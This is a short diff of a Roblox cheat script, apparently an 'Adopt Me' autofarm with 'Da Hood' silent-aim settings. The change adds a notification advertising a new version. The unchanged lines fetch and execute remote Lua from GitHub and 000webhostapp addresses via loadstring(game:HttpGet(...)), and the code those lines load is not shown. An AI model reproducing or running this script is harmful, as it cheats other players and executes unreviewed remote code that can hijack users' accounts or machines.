@@ -13,6 +13,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/
 loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/blacklist.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/xxx"))()
 loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/resolver.lua"))()
+game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Adopt me v2", Text = "v3 comning out soon with way more stuff ws#0001", Duration = 4,});
+
 
 local DaHoodSettings = {
     SilentAim = true,
